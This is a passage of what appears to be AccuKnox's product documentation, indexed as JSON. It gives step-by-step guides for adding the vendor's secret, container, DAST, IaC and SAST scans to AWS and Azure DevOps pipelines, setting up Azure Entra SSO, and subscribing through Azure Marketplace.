configuration:</p> <pre><code>version: 0.2\n\nenv:\n  variables:\n    RESULTS: \"\"\n    BRANCH: \"all\"\n    EXCLUDE_PATHS: \"\"\n\nphases:\n  pre_build:\n    commands:\n      - echo \"Installing AccuKnox ASPM scanner...\"\n      - pip install https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.13.4/accuknox_aspm_scanner-0.13.4-py3-none-any.whl --break-system-packages\n\n  build:\n    commands:\n      - |\n        echo \"Running AccuKnox secret scan\"\n\n        if [ \"$SOFT_FAIL\" = \"true\" ]; then\n          SOFT_FAIL_ARG=\"--softfail\"\n        fi\n\n        COMMAND=\"git file://.\"\n        ARGS=\"\"\n        [ -n \"$RESULTS\" ] &amp;&amp; ARGS=\"$ARGS --results $RESULTS\"\n        [ -n \"$BRANCH\" ] &amp;&amp; ARGS=\"$ARGS --branch $BRANCH\"\n        [ -n \"$EXCLUDE_PATHS\" ] &amp;&amp; ARGS=\"$ARGS --exclude-paths $EXCLUDE_PATHS\"\n\n        echo accuknox-aspm-scanner scan $SOFT_FAIL_ARG secret --command \"$COMMAND $ARGS\" --container-mode\n        accuknox-aspm-scanner scan $SOFT_FAIL_ARG secret --command \"$COMMAND $ARGS\" --container-mode\n</code></pre>"},{"location":"integrations/aws-secret-scan/#workflow-execution","title":"Workflow Execution","text":""},{"location":"integrations/aws-secret-scan/#without-accuknox","title":"Without AccuKnox","text":"<p>\ud83d\udcd6 Reference</p> <ul> <li>Scans secrets for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</li> </ul>"},{"location":"integrations/aws-secret-scan/#with-accuknox","title":"With AccuKnox","text":"<p>\ud83d\udcd6 Reference</p> <ul> <li>Scan results are automatically sent to AccuKnox for further risk assessment and remediation.</li> </ul> <p></p>"},{"location":"integrations/aws-secret-scan/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<p>\ud83d\udcd6 Reference</p> <ol> <li>After the pipeline run, log in to AccuKnox.</li> <li> <p>To see all of your Secret Scan findings, navigate to:    AccuKnox \u2192 Issues \u2192 Findings \u2192 Secret Scan Findings </p> </li> <li> <p>Click on any finding to get more details.    You can also click on Create Ticket to generate a ticket. </p> </li> </ol> <p>Let us know if you are seeking additional guidance in planning your cloud security program.</p>"},{"location":"integrations/azure-container-scan/","title":"Container Image Scan with Azure DevOps","text":"<p>This guide walks you through integrating AccuKnox into Azure DevOps pipelines to perform vulnerability scans on Docker images as part of your CI workflow. By embedding security earlier in the development lifecycle, this setup helps prevent the deployment of flawed containers.</p>"},{"location":"integrations/azure-container-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning, ensure the following:</p> <ul> <li> <p>Azure DevOps project with a configured pipeline.</p> </li> <li> <p>Access to AccuKnox</p> </li> </ul>"},{"location":"integrations/azure-container-scan/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/azure-container-scan/#step-1-install-accuknox-opengrep-sast-extension","title":"Step 1: Install AccuKnox Opengrep SAST Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace</p> </li> <li> <p>Search for AccuKnox Container Scan and select Get it free to add to your Azure DevOps organization.    </p> </li> <li> <p>Choose your Azure organization and click Install.    </p> </li> <li> <p>Once installed, the AccuKnox Container Scan extension will be available in your pipeline.    </p> </li> </ol>"},{"location":"integrations/azure-container-scan/#step-2-generate-accuknox-api-token","title":"Step 2: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to AccuKnox. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/azure-container-scan/#step-3-configure-azure-devops-secrets","title":"Step 3: Configure Azure DevOps Secrets","text":"<ol> <li> <p>Go to Azure DevOps &gt; Pipelines &gt; Library.</p> </li> <li> <p>Create a Variable Group or add Pipeline Secrets.</p> </li> <li> <p>Store the following values:</p> </li> </ol> Name Description <code>accuknoxEndpoint</code> The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>) <code>accuknoxToken</code> Token for authenticating with the AccuKnox CSPM panel <code>accuknoxLabel</code> Label to categorize or tag the scan results <p>The label used to categorize and identify scan results in AccuKnox. Create a new label if it is not available</p>"},{"location":"integrations/azure-container-scan/#step-4-define-azure-devops-pipeline","title":"Step 4: Define Azure DevOps Pipeline","text":"<p>In your Azure repo, create/update your pipeline YAML (<code>azure-pipelines.yml</code>) and add the following task to your pipeline's steps section:</p> <pre><code>trigger:\n  - main\n\npr:\n  - main\n\npool:\n  vmImage: ubuntu-latest\n\nvariables:\n  - group: accuknox\n  - name: imageRepository\n    value: azuredevopstest\n  - name: imageTag\n    value: v1\n\nsteps:\n  - task: Docker@2\n    displayName: \"Build Docker Image\"\n    inputs:\n      command: build\n      Dockerfile: \"**/Dockerfile\"\n      repository: \"$(imageRepository)\"\n      tags: |\n        $(imageTag)\n  - task: accuknox-container-scan@1.1.1\n    inputs:\n      tag: $(imageTag)\n      imageName: $(imageRepository)\n      accuknoxEndpoint: \"$(accuknoxEndpoint)\"\n      accuknoxToken: \"$(accuknoxToken)\"\n      accuknoxLabel: \"$(accuknoxLabel)\"\n</code></pre>"},{"location":"integrations/azure-container-scan/#inputs-for-accuknox-container-scanning","title":"Inputs for AccuKnox Container Scanning","text":"Name Description Required Default <code>accuknoxEndpoint</code> AccuKnox CSPM panel URL Yes <code>cspm.demo.accuknox.com</code> <code>accuknoxToken</code> AccuKnox API Token Yes <code>accuknoxLabel</code> Label for scan results Yes <code>inputSoftFail</code> Continue even if the scan fails No <code>true</code> <code>imageName</code> The name of the Docker image Yes <code>tag</code> The tag for the Docker image No <code>$BUILD_BUILDNUMBER</code> <code>severity</code> Comma-separated list of vulnerability severities that trigger failure when <code>inputSoftFail</code> is disabled No <code>UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</code>"},{"location":"integrations/azure-container-scan/#after-accuknox-integration","title":"After AccuKnox Integration","text":"<p>Workflow Enhancements:</p> <ul> <li> <p>Docker images are automatically scanned for vulnerabilities during the build stage.</p> </li> <li> <p>The pipeline fails if critical issues are found, preventing insecure images from being deployed.</p> </li> </ul> <p>Outcome:</p> <ul> <li> <p>Security issues are detected and resolved early, before images reach production.</p> </li> <li> <p>Only verified, secure images are pushed to the container registry.</p> </li> </ul> <p></p>"},{"location":"integrations/azure-container-scan/#viewing-scan-results-in-accuknox","title":"Viewing Scan Results in AccuKnox","text":"<p>Step 1: After the pipeline is complete, log in to the AccuKnox platform and navigate to Issues \u2192 RegistryScan. Locate your image by the repository or tag used in the Azure DevOps pipeline, and click to view associated scan findings.</p> <p></p> <p>Step 2: Selecting the image will display detailed metadata, including image name, tag, build time, and source repository information, all linked to the pipeline execution in Azure DevOps.</p> <p></p> <p>Step 3: In the Vulnerabilities section, you'll find a list of identified issues specific to the scanned image. Each item includes severity, package name, version, and remediation details. These are also accessible under Issues \u2192 Vulnerabilities for cross-image management.</p> <p></p> <p>Step 4: The Resources section outlines the underlying packages and modules that were used to build the Docker image---helpful for dependency tracking and vulnerability source analysis.</p> <p></p> <p>Step 5: You can explore the Scan History tab to track scans over time, observe vulnerability trends, and verify improvements from one pipeline execution to the next.</p> <p></p>"},{"location":"integrations/azure-container-scan/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox into your Azure DevOps pipeline, you gain continuous visibility into container vulnerabilities. This integration ensures that only thoroughly scanned and secure Docker images are deployed, reinforcing your production security posture and reducing attack surface.</p>"},{"location":"integrations/azure-dast/","title":"AccuKnox DAST with Azure DevOps","text":"<p>To demonstrate the benefits of incorporating AccuKnox DAST into an Azure DevOps CI/CD pipeline for enhanced security, this document outlines the steps to configure the integration, run DAST scans, and view results in the AccuKnox SaaS platform.</p> <p></p>"},{"location":"integrations/azure-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Access to an Azure DevOps project.</p> </li> <li> <p>Access to the AccuKnox platform.</p> </li> <li> <p>A configured Azure DevOps agent for pipeline execution.</p> </li> </ul>"},{"location":"integrations/azure-dast/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/azure-dast/#step-1-install-the-accuknox-dast-extension","title":"Step 1: Install the AccuKnox DAST Extension","text":"<ol> <li> <p>Navigate to the Azure DevOps Marketplace.</p> </li> <li> <p>Search for AccuKnox DAST and click Get it free to install the extension in your Azure DevOps organization. </p> </li> <li> <p>Select an Azure organization and click on Install. </p> </li> <li> <p>Once installed, the AccuKnox DAST extension will be ready to use in your pipelines.</p> </li> </ol> <p></p>"},{"location":"integrations/azure-dast/#step-2-generate-accuknox-token","title":"Step 2: Generate AccuKnox Token","text":"<ol> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and create an AccuKnox token.</p> </li> <li> <p>Copy the generated token and store it securely for later use. For detailed steps, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"integrations/azure-dast/#step-3-configure-variables-in-azure-devops","title":"Step 3: Configure Variables in Azure DevOps","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library &gt; + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Secret Name Description <code>targetUrl</code> URL of the web application to scan. <code>accuknoxEndpoint</code> URL of the AccuKnox CSPM API. <code>accuknoxToken</code> AccuKnox API token. <code>accuknoxLabel</code> Label to group findings in AccuKnox."},{"location":"integrations/azure-dast/#step-4-add-accuknox-dast-task-to-the-pipeline","title":"Step 4: Add AccuKnox DAST Task to the Pipeline","text":"<ol> <li> <p>Open your Azure DevOps pipeline YAML file or create a new one.</p> </li> <li> <p>Add the following task under the <code>steps</code> block:</p> </li> </ol> <pre><code>steps:\n  - task: accuknox-dast@0\n    inputs:\n      targetURL: $(TARGET_URL)\n      accuknoxEndpoint: $(ACCUKNOX_ENDPOINT)\n      accuknoxToken: $(ACCUKNOX_TOKEN)\n      accuknoxLabel: $(ACCUKNOX_LABEL)\n      scanType: $(SCAN_TYPE)\n      qualityGate: $(QUALITY_GATE)\n</code></pre>"},{"location":"integrations/azure-dast/#step-5-run-the-pipeline","title":"Step 5: Run the Pipeline","text":"<ol> <li> <p>Trigger the pipeline manually or through a code change.</p> </li> <li> <p>Monitor the pipeline logs to verify that the AccuKnox DAST task is running successfully. </p> </li> </ol>"},{"location":"integrations/azure-dast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select DAST Findings to see identified vulnerabilities. </p> <p>Step 3: Click on a vulnerability to view more details. </p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability. </p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue tracking system to address the identified vulnerability. </p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the Azure pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/azure-dast/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox DAST with Azure DevOps pipelines ensures continuous security by identifying vulnerabilities during the build process. It provides visibility into security issues and enhances deployment safety. AccuKnox DAST supports a wide range of CI/CD tools, making it a versatile choice for secure DevOps practices.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/azure-entra-sso/","title":"Azure Entra SSO with AccuKnox","text":"<p>This guide helps you integrate Azure Entra (formerly Azure Active Directory) with AccuKnox using OpenID Connect (OIDC) for Single Sign-On (SSO).</p>"},{"location":"integrations/azure-entra-sso/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Azure Entra Admin privileges</p> </li> <li> <p>Access to AccuKnox Tenant for user invitation</p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#step-by-step-integration-guide","title":"Step-by-Step Integration Guide","text":""},{"location":"integrations/azure-entra-sso/#1-create-azure-application-app-registration","title":"1. Create Azure Application (App Registration)","text":"<ol> <li> <p>Sign in to Azure Portal</p> </li> <li> <p>Navigate to Azure Active Directory &gt; App registrations</p> </li> <li> <p>Click New registration </p> </li> <li> <p>Name: Any meaningful name (e.g., <code>AccuKnox SSO</code>)</p> </li> <li> <p>Supported account types: Choose Single tenant</p> </li> <li> <p>Redirect URI: Type: <code>Web</code> URI: <code>https://cspm.accuknox.com/oidc/callback</code> </p> </li> <li> <p>Click Register</p> </li> </ol>"},{"location":"integrations/azure-entra-sso/#2-gather-required-information","title":"2. Gather Required Information","text":"<p>Once you've registered the Azure app, collect the following details to complete your SSO setup with AccuKnox:</p> Field Description Name Name of your organization (used during login) OIDC RP Client ID Application (client) ID OIDC RP Client Secret Secret value OIDC OP Authorization Endpoint OAuth 2.0 authorization endpoint (v2) OIDC OP Token Endpoint OAuth 2.0 token endpoint (v2) OIDC OP User Endpoint Default: <code>https://graph.microsoft.com/oidc/userinfo</code> OIDC OP JWKS Endpoint Format: <code>https://login.microsoftonline.com/&lt;Tenant-ID&gt;/discovery/v2.0/keys</code>Replace <code>&lt;Tenant-ID&gt;</code> with your Directory (tenant) ID from the app overview OIDC RP Sign Algo Default: <code>RS256</code>"},{"location":"integrations/azure-entra-sso/#name","title":"Name","text":"<ul> <li> <p>This is the name of your organization.</p> </li> <li> <p>It will be used on the AccuKnox login screen during OpenID sign-in.</p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#oidc-rp-client-id","title":"OIDC RP Client ID","text":"<ul> <li> <p>Go to the App Overview page.</p> </li> <li> <p>Copy the value of Application (client) ID. </p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#oidc-rp-client-secret","title":"OIDC RP Client Secret","text":"<ul> <li> <p>Navigate to Certificates &amp; secrets.</p> </li> <li> <p>Click New client secret.</p> </li> <li> <p>Enter a description and expiry period.</p> </li> <li> <p>Click Add and copy the secret value shown.</p> </li> </ul> <p></p>"},{"location":"integrations/azure-entra-sso/#oidc-op-authorization-endpoint","title":"OIDC OP Authorization Endpoint","text":"<ul> <li> <p>Go to the App Overview page.</p> </li> <li> <p>Click on Endpoints (top-right).</p> </li> <li> <p>Copy the URL under OAuth 2.0 authorization endpoint (v2). </p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#oidc-op-token-endpoint","title":"OIDC OP Token Endpoint","text":"<ul> <li> <p>From the same Endpoints panel.</p> </li> <li> <p>Copy the URL for OAuth 2.0 token endpoint (v2). </p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#oidc-op-jwks-endpoint","title":"OIDC OP JWKS Endpoint","text":"<ul> <li> <p>Format:   <code>https://login.microsoftonline.com/&lt;Tenant-ID&gt;/discovery/v2.0/keys</code></p> </li> <li> <p>Replace <code>&lt;Tenant-ID&gt;</code> with your Directory (tenant) ID, found on the app's Overview page. </p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#3-provide-the-details-to-accuknox","title":"3. Provide the Details to AccuKnox","text":"<p>Once you've collected all the required information (Client ID, Secret, Endpoints, etc.), the next step is to provide it to AccuKnox to complete the SSO integration.</p>"},{"location":"integrations/azure-entra-sso/#for-accuknox-saas-users","title":"For AccuKnox SaaS Users","text":"<ul> <li> <p>Share the details securely with the AccuKnox support team.</p> </li> <li> <p>The team will configure the backend for your organization based on the provided information.</p> </li> </ul>"},{"location":"integrations/azure-entra-sso/#for-accuknox-on-premise-users","title":"For AccuKnox On-Premise Users","text":"<ul> <li>You can directly input the configuration into your admin portal: IDP Providers Configuration Page</li> </ul>"},{"location":"integrations/azure-entra-sso/#user-invitation-process","title":"User Invitation Process","text":""},{"location":"integrations/azure-entra-sso/#invite-azure-users-to-accuknox","title":"Invite Azure Users to AccuKnox","text":"<ol> <li> <p>Log in to the AccuKnox SaaS console</p> </li> <li> <p>Go to User Management &gt; Invite User </p> </li> <li> <p>Enter the email address of the user with other details and send invite. </p> </li> </ol> <p>Note</p> <p>Ensure the invited Azure Entra user has their email field filled in under Contact Information in their Azure profile. The email must exactly match the one used during the AccuKnox invitation. </p>"},{"location":"integrations/azure-entra-sso/#logging-in-to-accuknox-via-azure-entra-sso","title":"Logging in to AccuKnox via Azure Entra SSO","text":"<ol> <li> <p>Navigate to the AccuKnox Login Page</p> </li> <li> <p>Click OpenID </p> </li> <li> <p>Enter your organization name (as provided above) </p> </li> <li> <p>Finally Sign in using your Azure credentials</p> </li> </ol>"},{"location":"integrations/azure-iac/","title":"Azure DevOps IaC Scan Integration","text":"<p>This guide demonstrates how to integrate Infrastructure as Code (IaC) security into an Azure DevOps pipeline using the AccuKnox IaC Scan extension. By implementing automated checks, you can identify configuration vulnerabilities in your IaC templates and send the results to AccuKnox for thorough analysis and remediation. This ensures your infrastructure aligns with security best practices and minimizes deployment risks.</p>"},{"location":"integrations/azure-iac/#pre-requisites","title":"Pre-requisites","text":"<ul> <li>Azure DevOps access.</li> <li>AccuKnox Platform access.</li> </ul>"},{"location":"integrations/azure-iac/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/azure-iac/#step-1-install-the-accuknox-iac-scan-extension","title":"Step 1: Install the AccuKnox IaC Scan Extension","text":"<ol> <li> <p>Navigate to the AccuKnox IaC Scan Extension in the Azure DevOps Marketplace.</p> </li> <li> <p>Click Get it free to install the extension in your Azure DevOps organization. </p> </li> <li> <p>Select the Azure DevOps Organization where you want to install the extension and follow the installation instructions. </p> </li> </ol> <p>Once installed, you can use the <code>AccuKnox-iac-scan</code> task in your pipeline YAML. </p>"},{"location":"integrations/azure-iac/#step-2-generate-accuknox-token","title":"Step 2: Generate AccuKnox Token","text":"<p>Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/azure-iac/#step-3-configure-azure-devops-pipeline-variables","title":"Step 3: Configure Azure DevOps Pipeline Variables","text":"<ol> <li> <p>Go to Azure DevOps &gt; Pipelines &gt; Library.</p> </li> <li> <p>Create a Variable Group or add Pipeline Secrets.</p> </li> <li> <p>Store the following values:</p> </li> <li> <p><code>ACCUKNOX_ENDPOINT</code>: The AccuKnox API URL (e.g., <code>cspm.demo.accuknox.com</code>).</p> </li> <li> <p><code>ACCUKNOX_TENANT_ID</code>: Your AccuKnox tenant ID.</p> </li> <li> <p><code>ACCUKNOX_TOKEN</code>: The AccuKnox API token for authorization.</p> </li> <li> <p><code>ACCUKNOX_LABEL</code>: The label to associate with the scan results.</p> </li> </ol>"},{"location":"integrations/azure-iac/#step-4-add-the-accuknox-iac-scan-task-to-your-pipeline","title":"Step 4: Add the AccuKnox IaC Scan Task to Your Pipeline","text":"<p>Edit your Azure DevOps pipeline YAML file to include the AccuKnox IaC Scan task. Below is an example configuration:</p> <pre><code>- task: accuknox-iac@1.0.1\n  inputs:\n    accuknoxEndpoint: \"&lt;ACCUKNOX_ENDPOINT&gt;\"\n    accuknoxToken: \"&lt;ACCUKNOX_TOKEN&gt;\"\n    accuknoxLabel: \"&lt;ACCUKNOX_LABEL&gt;\"\n    inputQuiet: true\n    inputCompact: true\n</code></pre>"},{"location":"integrations/azure-iac/#step-5-execute-the-pipeline","title":"Step 5: Execute the Pipeline","text":"<p>Run your pipeline. The AccuKnox IaC Scan extension will analyze your IaC code for vulnerabilities or misconfigurations, and the findings will be uploaded to the AccuKnox platform.</p> <p></p>"},{"location":"integrations/azure-iac/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the pipeline completes, navigate to the AccuKnox SaaS Dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select IaC Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details and follow the instructions in the Solutions tab.</p> <p></p> <p>Step 4: For unresolved vulnerabilities, create a ticket in your issue tracking system.</p> <p></p> <p>Step 5: After fixing the vulnerabilities, rerun the Azure pipeline and verify that the issues have been resolved in the AccuKnox dashboard.</p>"},{"location":"integrations/azure-iac/#conclusion","title":"Conclusion","text":"<p>By integrating the AccuKnox IaC Scan extension into your Azure DevOps pipeline, you enhance the security of your infrastructure code. This integration enables early detection and remediation of vulnerabilities and misconfigurations, ensuring a secure and compliant deployment environment.</p>"},{"location":"integrations/azure-opengrep-sast/","title":"Integrating Opengrep SAST with AccuKnox in Azure DevOps","text":"<p>This guide shows how to integrate Opengrep SAST scanning into an Azure DevOps Pipeline and automatically forward results to AccuKnox for analysis and mitigation.</p>"},{"location":"integrations/azure-opengrep-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Azure DevOps Access: Access to your Azure DevOps project where the pipeline will be implemented.</p> </li> <li> <p>An active AccuKnox account.</p> </li> </ul>"},{"location":"integrations/azure-opengrep-sast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/azure-opengrep-sast/#step-1-install-accuknox-opengrep-sast-extension","title":"Step 1: Install AccuKnox Opengrep SAST Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace</p> </li> <li> <p>Search for AccuKnox Opengrep SAST and select Get it free to add to your Azure DevOps organization.     </p> </li> <li> <p>Choose your Azure organization and click Install.     </p> </li> <li> <p>Once installed, the AccuKnox Opengrep SAST extension will be available in your pipeline.     </p> </li> </ol>"},{"location":"integrations/azure-opengrep-sast/#step-2-generate-accuknox-api-token","title":"Step 2: Generate AccuKnox API Token","text":"<ul> <li> <p>Log in to the AccuKnox platform.</p> </li> <li> <p>Go to Settings &gt; Tokens and create a new token.</p> </li> <li> <p>Copy the token and save it for later use. For guidance on creating tokens, refer to Creating Tokens in AccuKnox.</p> </li> </ul>"},{"location":"integrations/azure-opengrep-sast/#step-3-configure-azure-devops-pipeline-variables","title":"Step 3: Configure Azure DevOps Pipeline Variables","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library and click + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Name Description accuknoxEndpoint The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>). accuknoxToken Token for authenticating with the AccuKnox CSPM panel. accuknoxLabel The label used to categorize and identify scan results in AccuKnox."},{"location":"integrations/azure-opengrep-sast/#step-4-define-azure-devops-pipeline","title":"Step 4: Define Azure DevOps Pipeline","text":"<p>In your Azure repo, create/update your pipeline YAML (<code>azure-pipelines.yml</code>) and add the following task to your pipeline's steps section:</p> <pre><code>steps:\n  - task: accuknox-opengrep-sast@1.0\n    inputs:\n      accuknoxEndpoint: $(accuknoxEndpoint)\n      accuknoxToken: $(accuknoxToken)\n      accuknoxLabel: $(accuknoxLabel)\n      inputSoftFail: false\n</code></pre>"},{"location":"integrations/azure-opengrep-sast/#inputs-for-accuknox-opengrep-sast-task","title":"Inputs for AccuKnox Opengrep SAST Task","text":"Name Description Required Default accuknoxEndpoint AccuKnox CSPM panel URL Yes cspm.demo.accuknox.com accuknoxToken AccuKnox API Token Yes accuknoxLabel Label for scan results Yes inputSoftFail Continue even if the scan fails No false"},{"location":"integrations/azure-opengrep-sast/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, Opengrep scans the code for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</p>"},{"location":"integrations/azure-opengrep-sast/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, Opengrep scan results are automatically sent to AccuKnox for further risk assessment and remediation.</p> <p></p>"},{"location":"integrations/azure-opengrep-sast/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li> <p>After the pipeline run, log in to AccuKnox.</p> </li> <li> <p>Go to Issues &gt; Findings and select Opengrep Findings.     </p> </li> <li> <p>Inspect vulnerabilities, apply fixes, and create tracking tickets if necessary.     </p> </li> </ol>"},{"location":"integrations/azure-opengrep-sast/#conclusion","title":"Conclusion","text":"<p>Integrating OpenGrep SAST with Azure DevOps pipelines enables automated vulnerability detection and centralized security management. It ensures early detection of issues, risk assessment, and provides actionable insights to maintain code security and quality</p>"},{"location":"integrations/azure-overview/","title":"Azure Cloud Build Integrations","text":""},{"location":"integrations/azure-overview/#azure-devops-integrations","title":"Azure DevOps Integrations","text":"<p>SAST (Static Analysis)</p> <p>SonarQube SAST</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p>Secrets Scan</p> <p></p>"},{"location":"integrations/azure-playbook/","title":"Azure Marketplace Installation Guide","text":"<p>This document outlines the process of subscribing to AccuKnox via Azure Marketplace, including necessary actions, subscription workflow, access acquisition, and subsequent steps post-access attainment.</p> <p>Visit Marketplace</p> <p>The following steps cater to users who:</p> <ol> <li>Want to get a free trial from the marketplace.</li> <li>Want to subscribe to existing public offers available via the marketplace.</li> <li>Need a private offer tailored to specific dimensions.</li> <li>Seek a recurring plan for public offers.</li> </ol>"},{"location":"integrations/azure-playbook/#case-1-accuknox-cnapp-free-trial-on-azure-saas","title":"Case 1: AccuKnox CNAPP Free Trial on Azure (SaaS)","text":"<p>Step 1:\u00a0Start off by searching for AccuKnox CNAPP\u00a0on the Azure marketplace.</p> <p></p> <p>Step 2:\u00a0After reviewing our offerings, proceed to locate the\u00a0Get it Now\u00a0option.</p> <p></p> <p>Step 3:\u00a0After Clicking on the\u00a0Get it Now\u00a0the register page opens up for users, where they provide their information, including their name, phone number, organization name, and email address.</p> <p></p> <p>Step 4:\u00a0After submitting the form by clicking on continue, users will be redirected to the user's Azure dashboard where they can Select the \"Starter plan\" for a free trial and then click on \"Subscribe\". The free trial lasts for 30 days and cannot be renewed.</p> <p></p> <p>NOTE</p> <p>If users desire a custom solution beyond the provided offers, they have the option to contact AccuKnox support to discuss alternative possibilities. Contact: support@accuknox.com</p> <p>Step 5:\u00a0After clicking on subscribe users will be taken to the project details page where they have to Name the SaaS and choose the resource group. Optionally, users can set up tags too. Then click on \"Review + subscribe\" and then subscribe to finalize the setup.</p> <p></p> <p></p> <p>Step 6:\u00a0Now to configure the SaaS account, users have to click on the \"Next step\" button, and then select \"Configure account now.\"</p> <p></p> <p>Step 7: You will be taken to the subscription details page. Review it for the final time and Click on \"Subscribe.\"</p> <p></p> <p>Step 8:\u00a0The subscription process may take some time. Users can click on \"Go to subscription list\" to check their subscription status.</p> <p></p> <p>Step 9:\u00a0You will receive an email regarding the subscription status. Once the subscription status changes from \"Pending Activation\" to \"Subscribed,\" you have completed the subscription.</p> <p></p> <p></p> <p>Step 10: You will receive an email confirming the successful subscription. They then have to click on the signup button, fill in the details, and create an account to get access to the AccuKnox platform.</p> <p></p> <p></p> <p>Step 11:\u00a0At this juncture, we strongly recommend scheduling a DEMO\u00a0with AccuKnox to assist the customer with the onboarding steps and gain a deeper understanding of our features.</p> <p>Step 12:\u00a0Shortly after we configure a tenant, you will recieve an invitation to access the SaaS platform and leverage its security features.</p> <p>NOTE</p> <p>The marketplace offers a free trial subscription for a month, which will be revoked after a month. Users can choose to continue using the platform with a paid subscription or schedule a demo before the end of the month.</p>"},{"location":"integrations/azure-sast/","title":"AccuKnox SAST in Azure DevOps","text":"<p>This guide shows how to integrate SAST scanning into an Azure DevOps Pipeline and automatically forward results to AccuKnox for analysis and mitigation.</p>"},{"location":"integrations/azure-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Azure DevOps Access: Access to your Azure DevOps project where the pipeline will be implemented.</p> </li> <li> <p>An active AccuKnox account.</p> </li> </ul>"},{"location":"integrations/azure-sast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/azure-sast/#step-1-install-accuknox-sast-extension","title":"Step 1: Install AccuKnox SAST Extension","text":"<ol> <li> <p>Visit the Azure DevOps Marketplace</p> </li> <li> <p>Search for AccuKnox SAST and select Get it free to add to your Azure DevOps organization. </p> </li> <li> <p>Choose your Azure organization and click Install. </p> </li> <li> <p>Once installed, the AccuKnox SAST extension will be available in your pipeline. </p> </li> </ol>"},{"location":"integrations/azure-sast/#step-2-configure-azure-devops-pipeline-variables","title":"Step 2: Configure Azure DevOps Pipeline Variables","text":"<ol> <li> <p>Navigate to your Azure DevOps project.</p> </li> <li> <p>Go to Project Settings &gt; Pipelines &gt; Library and click + Variable Group.</p> </li> <li> <p>Add the following variables:</p> </li> </ol> Name Description accuknoxEndpoint The URL of the CSPM panel to push the scan results to (e.g., <code>cspm.demo.accuknox.com</code>). accuknoxToken Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. accuknoxLabel The label used to categorize and identify scan results in AccuKnox. Refer to How to Create Labels."},{"location":"integrations/azure-sast/#step-3-define-azure-devops-pipeline","title":"Step 3: Define Azure DevOps Pipeline","text":"<p>In your Azure repo, create/update your pipeline YAML (<code>azure-pipelines.yml</code>) and add the following task to your pipeline's steps section:</p> <pre><code>steps:-\n- task: AccuKnox-SAST@2\n  inputs:\n    accuknoxEndpoint: $(accuknoxEndpoint)\n    accuknoxToken: $(accuknoxToken)\n    accuknoxLabel: $(accuknoxLabel)\n    softFail: true\n</code></pre>"},{"location":"integrations/azure-sast/#inputs-for-accuknox-sast-task","title":"Inputs for AccuKnox SAST Task","text":"Name Description Required Default accuknoxEndpoint AccuKnox CSPM panel URL Yes cspm.demo.accuknox.com accuknoxToken AccuKnox API Token Yes accuknoxLabel Label for scan results Yes softFail Continue even if the scan fails No false"},{"location":"integrations/azure-sast/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, scans the code for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</p>"},{"location":"integrations/azure-sast/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, scan results are automatically sent to AccuKnox for further risk assessment and remediation.</p> <p></p>"},{"location":"integrations/azure-sast/#viewing-results-in-accuknox","title":"Viewing 